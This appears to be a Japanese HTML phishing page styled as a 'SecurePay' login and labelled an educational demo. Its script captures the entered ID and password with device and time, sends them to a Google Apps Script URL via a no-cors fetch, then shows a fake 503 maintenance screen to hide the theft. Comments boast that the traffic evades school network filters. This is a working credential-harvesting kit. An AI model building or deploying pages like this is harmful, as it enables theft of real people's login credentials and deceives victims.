<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ログイン | セキュリティ確認（デモ）</title>
  <link rel="stylesheet" href="style.css">
</head>
<body class="victim-body">
  
  <div class="demo-warning">
    🚨 ［セキュリティ学習用デモ］これは教育目的の擬似サイトです。
  </div>

  <!-- ログイン入力フォーム -->
  <div class="login-container" id="login-box">
    <div class="mock-logo">
      <span class="logo-icon">🛡️ S</span>
      <span>SecurePay</span>
    </div>

    <h2>アカウントログイン</h2>
    <p class="subtitle">サービスをご利用いただくにはログインが必要です</p>
    
    <form id="login-form">
      <div class="input-group">
        <label>ユーザーID / メールアドレス</label>
        <input type="text" id="username" placeholder="example@email.com" required>
      </div>
      <div class="input-group">
        <label>パスワード</label>
        <input type="password" id="password" placeholder="••••••••" required>
      </div>
      <button type="submit" id="login-btn" class="btn-primary">ログイン</button>
    </form>
  </div>

  <!-- ⚠️ エラー画面（ログイン後にスマホで表示され、そのまま留まる） -->
  <div class="login-container hidden" id="error-box">
    <div class="error-icon">⚠️</div>
    <h3 style="color: #d9534f;">HTTP 503 Service Unavailable</h3>
    <p>現在システムメンテナンス中です。<br>恐れ入りますが、しばらく時間を置いてから再度お試しください。</p>
  </div>

  <script>
    // 先ほどコピーしたGoogle Apps Scriptの「ウェブアプリのURL」をここに貼り付けてください
    const API_URL = "ここにGASのウェブアプリURLを貼り付け";

    function getDeviceInfo() {
      const ua = navigator.userAgent;
      if (ua.includes("iPhone")) return "iPhone (iOS)";
      if (ua.includes("iPad")) return "iPad (iOS)";
      if (ua.includes("Android")) return "Androidスマホ";
      if (ua.includes("Windows")) return "Windows PC";
      if (ua.includes("Mac")) return "Mac PC";
      return "不明な端末";
    }

    document.getElementById('login-form').addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const device = getDeviceInfo();
      const time = new Date().toLocaleTimeString();

      const payload = { time, device, username, password };

      // 学校のネット制限に引っかからない普通のHTTPS通信で安全に送信！
      fetch(API_URL, {
        method: "POST",
        mode: "no-cors", // CORS制限を回避して確実に飛ばすおまじない
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      }).catch(err => console.log(err));

      // スマホ側はフォームを隠してエラー画面を表示し、そこで完全にストップ！
      document.getElementById('login-box').classList.add('hidden');
      document.getElementById('error-box').classList.remove('hidden');
    });
  </script>
</body>
</html>
